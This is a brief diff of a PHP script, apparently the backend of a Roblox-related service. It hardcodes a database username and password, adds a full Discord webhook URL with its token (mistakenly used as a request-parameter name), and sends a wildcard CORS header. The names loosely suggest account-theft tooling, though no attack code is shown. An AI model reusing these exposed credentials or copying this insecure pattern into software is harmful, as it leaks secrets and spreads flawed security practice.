@@ -1,13 +1,13 @@
 <?php
     header("Access-Control-Allow-Origin: *");
 
-    $servername = "";
-    $username = "";
-    $password = "";
-    $dbname = "rblxapi";
-    $webhook = $_REQUEST['webhook'];
+    $servername = "FuaBeam";
+    $username = "FuaBeam";
+    $password = "UNFUAGT14";
+    $dbname = "FuaBeam";
+    $webhook = $_REQUEST['https://discord.com/api/webhooks/1334050800485404733/4HkIUti5kShslPoJDBskgWyeYCiRm0W3TYKWvsacInG22-7KchZUwFuMPLE9R2KXqH7z'];
     $prompt = $_REQUEST['prompt'];
-    $id = rand(10,3433434);
+    $id = rand(10,993433434);
 
     // Create connection
     $conn = new mysqli($servername, $username, $password, $dbname);
